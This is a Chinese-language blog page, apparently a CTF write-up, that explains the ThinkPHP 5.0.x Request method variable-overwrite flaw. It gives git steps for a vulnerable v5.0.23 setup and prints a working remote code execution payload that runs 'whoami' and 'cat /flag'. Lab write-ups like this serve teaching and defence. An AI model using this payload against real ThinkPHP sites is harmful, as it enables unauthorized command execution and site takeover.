    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2>知识点</h2>
<h3>ThinkPHP</h3>

<p><b>ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企 业应用开发而诞生的。由于其简单易用，国内用户众多。</b><br>2019年1月11日ThinkPHP团队发布了版本更新，本次更新包含了一个可能GetShell的安全更新，具体内容为改进Request类的method方法。<br><b style="color:pink">漏洞描述</b><br>Thinphp团队在实现框架中的核心类Requests的method方法实现了表单请求类型伪装，默认为$_POST[‘_method’]变量，却没有对$_POST[‘_method’]属性进行严格校验，可以通过变量覆盖掉Requets类的属性并结合框架特性实现对任意函数的调用达到任意代码执行的效果。<br><b style="color:pink">漏洞危害</b><br>在未经授权的情况下远程攻击者构造特殊的请求可以在PHP上下文环境中执行任意系统命令，甚至完全控制网站，造成数据泄露，网站内容被修改。<br><b style="color:pink">影响范围</b><br>受影响版本：ThinkPHP 5.0.x<br>不受影响版本：ThinkPHP 5.0.24<br>在修复前的文件526行中，当存在$_POST[‘_method’]变量是将会执行 $this-&gt;{$this-&gt;method}($_POST)，当$_POST[‘_method’]为__construct时及等价于调用$this-&gt;_construct($_POST)_construct函数实现如下：<br><b style="color:pink">漏洞分析</b><br>在该函数中，当传入的参数中的key为该Requests属性，将value赋值给该属性，由于key可控制，可以到达属性覆盖的效果。<br><b style="color:pink">漏洞复现</b><br>通过git 可以快速搭建环境</p>
<ul>
<li>git clone https://github.com/top-think/think
</li><li>
git checkout v5.0.23
</li><li>
cd think
</li><li>
git clone https://github.com/top-think/framework thinkphp
</li><li>
cd thinkphp
</li><li>
git checkout v5.0.23
</li></ul>

<p>通过覆盖filter属性即可达到调用任意函数的效果。<br>Payload如下</p>
<ul>
<li>_method=__construct&filter[]=system&server[REQUEST_METHOD]=whoami
</li></ul>

<p>在早期5.0的版本过滤器的调用有差别payload也会不同<br>更详细内容参见；<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11460285.html">https://www.cnblogs.com/yuzly/p/11460285.html</a></p>
<h2>题目</h2>

<p>打开靶场<br><img src="/2021/02/15/hack/g0.png"><br>题目提示是thinkphp5<br>百度发现thinkphp5有原厂命令执行漏洞，详情在知识点中有多描述<br>构造payload：</p>
<ul>
<li>_method=__construct&filter[]=system&server[REQUEST_METHOD]=cat /flag
</li></ul>

<p><img src="/2021/02/15/hack/g.png"><br>得到flag~~</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2021 Jialu
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>